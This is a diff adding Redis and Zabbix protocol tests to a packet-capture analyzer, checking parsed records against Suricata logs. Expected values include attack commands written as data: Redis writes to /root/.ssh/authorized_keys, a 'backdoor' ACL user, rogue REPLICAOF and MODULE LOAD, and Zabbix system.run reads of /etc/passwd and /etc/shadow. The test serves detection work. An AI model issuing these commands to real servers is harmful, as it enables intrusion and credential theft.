@@ -867,6 +867,148 @@ class TestMySQL(unittest.TestCase):
 
 
 @unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestRedis(unittest.TestCase):
+    """tests/protocol_fixtures.write_redis_pcap: one record per Redis
+    connection and per distinct admin command - with what Suricata 8.0.8
+    logged for the capture (tests/data/redis_fixture.eve.json): flows it
+    gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_redis_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'redis.pcap')
+        write_redis_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['redis'] for r in cls.records if r['event_type'] == 'redis'}
+        cls.commands = {r['redis_command']['command']: r['redis_command'] for r in cls.records
+                        if r['event_type'] == 'redis_command'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_logins(self):
+        self.assertEqual((self.connections[43000]['auth'], self.connections[43000]['errors']), ('required', {'NOAUTH': 1}))
+        inline = self.connections[43001]
+        self.assertEqual({k: inline.get(k) for k in ('inline', 'password', 'auth', 'login_failures', 'commands')},
+                         {'inline': True, 'password': 'wrongpass', 'auth': 'failed', 'login_failures': 1,
+                          'commands': {'AUTH': 1, 'INFO': 1}})
+        session = self.connections[43002]
+        self.assertEqual({k: session.get(k) for k in ('auth', 'user', 'password', 'server_version', 'server_os', 'role',
+                                                      'changes', 'keys', 'errors')},
+                         {'auth': 'succeeded', 'user': 'default', 'password': 'S3cretPass', 'server_version': '8.0.2',
+                          'server_os': 'Linux 6.12.113+deb13-amd64 x86_64', 'role': 'master', 'changes': 3,
+                          'keys': ['session:1', 'crackit'], 'errors': {'ERR': 3}})
+
+    def test_resp3_pipelining_and_pushes(self):
+        """HELLO 3's map gives the version; two commands in one segment get
+        their two answers; a pushed message answers nothing."""
+        r = self.connections[43003]
+        self.assertEqual({k: r.get(k) for k in ('auth', 'server_version', 'commands', 'keys')},
+                         {'auth': 'none', 'server_version': '7.2.4', 'keys': ['a', 'b'],
+                          'commands': {'HELLO': 1, 'KEYS': 1, 'SET': 2, 'SUBSCRIBE': 1}})
+
+    def test_admin_commands(self):
+        self.assertEqual(sorted(self.commands), [
+            'ACL SETUSER backdoor on >*** ~* +@all', 'CONFIG SET appendonly no', 'CONFIG SET dbfilename authorized_keys',
+            'CONFIG SET dir /root/.ssh', 'EVAL "return redis.call(\'dbsize\')" 0', 'FLUSHALL', 'MODULE LOAD /tmp/exp.so',
+            'REPLICAOF 10.66.66.66 21000', 'REPLICAOF NO ONE', 'SAVE'])
+        self.assertEqual(self.commands['ACL SETUSER backdoor on >*** ~* +@all']['password'], 'Backd00r!')
+        self.assertEqual(self.commands['CONFIG SET dir /root/.ssh']['result'],
+                         "ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config")
+        self.assertEqual(self.commands['REPLICAOF 10.66.66.66 21000']['master'], '10.66.66.66:21000')
+        self.assertNotIn('master', self.commands['REPLICAOF NO ONE'])
+        self.assertEqual((self.commands['MODULE LOAD /tmp/exp.so']['module'], self.commands['EVAL "return redis.call(\'dbsize\')" 0']['result']),
+                         ('/tmp/exp.so', '2'))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('redis_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (4, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'redis_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'redis.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('redis'), counts.get('redis_command')), (4, 10))
+        self.assertNotIn('conn_resp', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestZabbix(unittest.TestCase):
+    """tests/protocol_fixtures.write_zabbix_pcap: one record per Zabbix
+    client, server and request kind - with what Suricata 8.0.8 logged for
+    the capture (tests/data/zabbix_fixture.eve.json): flows it gives no
+    protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_zabbix_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'zabbix.pcap')
+        write_zabbix_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.zabbix = {r['zabbix']['request']: r['zabbix'] for r in cls.records if r['event_type'] == 'zabbix'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_passive_checks(self):
+        """zabbix_get's checks, a connection each, in one record: system.run
+        answered, and refused."""
+        r = self.zabbix['passive check']
+        self.assertEqual({k: r.get(k) for k in ('connections', 'version', 'not_supported', 'commands')},
+                         {'connections': 3, 'version': '7.0.22', 'not_supported': 1, 'commands': [
+                             {'command': 'id', 'via': 'system.run', 'result': 'uid=0(root) gid=0(root) groups=0(root)'},
+                             {'command': 'cat /etc/passwd', 'via': 'system.run', 'result': 'refused: Unsupported item key.'}]})
+        self.assertEqual((self.zabbix['passive checks']['keys'], self.zabbix['passive checks']['version']),
+                         (['system.uname'], '7.0.22'))
+
+    def test_active_checks_and_their_results(self):
+        """The server's item and remote command, their output from the
+        agent's later data."""
+        r = self.zabbix['active checks']
+        self.assertEqual((r['host'], r['connections'], r['keys']),
+                         ('web01', 2, ['system.uptime', 'system.run[cat /etc/passwd | head -3]', 'vfs.file.contents[/etc/shadow]']))
+        self.assertEqual([(c['command'], c['via'], c['result'].split('\n')[0]) for c in r['commands']],
+                         [('cat /etc/passwd | head -3', 'item', 'root:x:0:0:root:/root:/bin/bash'),
+                          ('id; uname -a', 'remote command', 'uid=0(root) gid=0(root) groups=0(root)')])
+        self.assertEqual((self.zabbix['agent data']['command_results'], self.zabbix['agent data']['connections']), (1, 2))
+
+    def test_proxy_credentials_and_scripts(self):
+        """Which kinds of credentials a proxy's configuration carried - never
+        their values."""
+        r = self.zabbix['proxy config']
+        self.assertEqual((r['host'], r['credentials']), ('Proxy1', {'ipmi_password': 1, 'tls_psk': 1, 'secret_macro': 1}))
+        self.assertNotIn('ipmiPass1', json.dumps(r))
+        self.assertEqual(self.zabbix['command']['commands'],
+                         [{'command': 'scriptid 6 hostid 10596', 'via': 'script',
+                           'result': 'Zabbix agent interface is not defined for host [Testhost]', 'refused': True}])
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('zabbix_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (10, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'zabbix_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'zabbix.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('zabbix'), 6)
+        self.assertNotIn('conn_zabbix', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
 class TestECAT(unittest.TestCase):
     """tests/protocol_fixtures.write_ecat_pcap: one record per EtherCAT
     master - with what Suricata 8.0.8 logged for the capture
